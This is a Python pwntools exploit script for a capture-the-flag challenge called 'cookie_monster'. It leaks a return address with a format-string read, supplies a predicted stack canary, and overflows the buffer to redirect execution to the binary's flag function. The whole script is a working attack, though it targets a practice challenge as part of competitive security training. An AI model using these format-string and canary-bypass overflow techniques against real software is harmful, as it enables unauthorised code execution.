from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "cookie_monster"
HOST = "ctf.umbccd.io"
PORT = 4200

r = process("for_rand")

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
off_ret = 0x134f
off_flag = elf.symbols["flag"]

#libc = ELF('./')
#
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	cookie = int(r.recvline(),16)
	#conn.sendlineafter("name?\n", "%9$p")
	conn.sendlineafter("name?\n", "%11$p")
	conn.recvuntil("Hello, ")
	addr_ret = int(conn.recvline(),16)
	bin_base = addr_ret - off_ret
	
	bufsize = 0x11
	at_cookie = 0x4
	
	payload = "A"*(bufsize - at_cookie)
	payload += p32(cookie)	
	payload += "A"*(bufsize - len(payload))
	payload += "A"*8
	payload += p64(bin_base+off_flag)

	conn.sendlineafter("cookie?", payload)
	print hex(bin_base)
	print hex(cookie)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
